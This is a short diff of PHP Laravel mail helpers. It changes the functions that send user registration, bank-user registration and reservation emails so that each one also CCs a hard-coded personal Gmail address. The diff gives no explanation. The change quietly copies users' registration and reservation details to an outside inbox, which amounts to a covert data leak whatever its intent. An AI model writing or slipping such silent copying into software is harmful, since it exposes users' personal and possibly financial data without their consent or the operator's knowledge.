@@ -50,13 +50,13 @@ function generateRandomString($length = 25) {
 }
 function sendRegisterEmail($data, $email){
     $details = $data;
-    Mail::to($email)->send(new \App\Mail\UserRegisterMail($details));
+    Mail::to($email)->cc(['bcreator.hinata@gmail.com'])->send(new \App\Mail\UserRegisterMail($details));
 }
 function sendBankRegisterEmail($data, $email){
     $details = $data;
-    Mail::to($email)->send(new \App\Mail\BankUserRegisterMail($details));
+    Mail::to($email)->cc(['bcreator.hinata@gmail.com'])->send(new \App\Mail\BankUserRegisterMail($details));
 }
 function sendReserveEmail($data, $email){
     $details = $data;
-    Mail::to($email)->send(new \App\Mail\ReserveMail($details));
+    Mail::to($email)->cc(['bcreator.hinata@gmail.com'])->send(new \App\Mail\ReserveMail($details));
 }
